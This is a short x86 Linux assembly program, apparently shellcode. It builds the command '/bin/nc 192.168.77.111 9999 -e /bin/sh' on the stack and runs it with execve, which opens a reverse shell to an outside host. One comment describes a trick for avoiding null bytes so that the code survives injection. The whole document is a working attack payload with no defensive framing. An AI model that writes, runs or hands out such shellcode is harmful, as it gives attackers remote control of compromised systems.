


global _start
section .text
_start:

    xor eax,eax
    xor ebx,ebx

    ; //bin/nc
    push eax
    push 0x636e2f6e
    push 0x69622f2f
    mov ebx,esp


    ;192.168.77.111
    push eax
    mov edx,0xf0f03131; here we make an and operation, in order to have 0000 after 3131, without using 0 (since that would break the code)
    and edx,0x0f0f3131
    push edx
    push 0x312e3737
    push 0x2e383631
    push 0x2e323931
    mov edi,esp

    ;9999
    push eax
    push 0x39393939
    mov ebp,esp

    ;-e/bin////sh
    push eax
    push 0x68732f2f
    push 0x2f2f6e69
    push 0x622f652d
    xor edx,edx
    mov edx,esp

    push eax
    push edx
    push ebp
    push edi
    push ebx
    mov ecx,esp
    mov edx,eax
    
    mov al,0xb
    int 0x80


